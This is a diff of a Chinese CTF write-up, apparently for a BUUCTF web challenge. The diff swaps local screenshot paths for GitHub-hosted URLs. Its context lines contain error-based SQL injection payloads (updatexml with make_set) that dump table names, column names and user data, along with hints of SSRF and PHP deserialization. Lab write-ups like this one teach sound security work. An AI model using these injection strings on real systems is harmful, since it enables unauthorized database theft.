@@ -14,7 +14,7 @@
 
 提示存在/user.php.bak
 
-![](images/72B39B1C0ED14DDCB968DEE590DB7BDCclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/72B39B1C0ED14DDCB968DEE590DB7BDCclipboard.png)
 
 # 2.user.php
 
@@ -85,7 +85,7 @@ get方法，明显存在ssrf漏洞，__construct也有可能存在序列化
 
 ?no=1 and updatexml(1,make_set(7,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
 
-![](images/5F5430D49C0C4854BCA3B330672C7588clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/5F5430D49C0C4854BCA3B330672C7588clipboard.png)
 
 
 
@@ -93,7 +93,7 @@ get方法，明显存在ssrf漏洞，__construct也有可能存在序列化
 
 ?no=1 and updatexml(1,make_set(7,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#
 
-![](images/F7D5C03BA44440D9BF8A2533F90600F7clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/F7D5C03BA44440D9BF8A2533F90600F7clipboard.png)
 
 
 
@@ -101,7 +101,7 @@ get方法，明显存在ssrf漏洞，__construct也有可能存在序列化
 
 ?no=1 and updatexml(1,make_set(7,'~',(select data from users)),1)#
 
-![](images/DA1AC6E0DDA340B1BD378E5E1FF07416clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/DA1AC6E0DDA340B1BD378E5E1FF07416clipboard.png)
 
 
 
@@ -147,7 +147,7 @@ echo serialize($u);
 
 # 7.触发构造的序列化数据
 
-![](images/2F17505F57C4427A80E43E85D1678BAEclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/2F17505F57C4427A80E43E85D1678BAEclipboard.png)
 
 
 
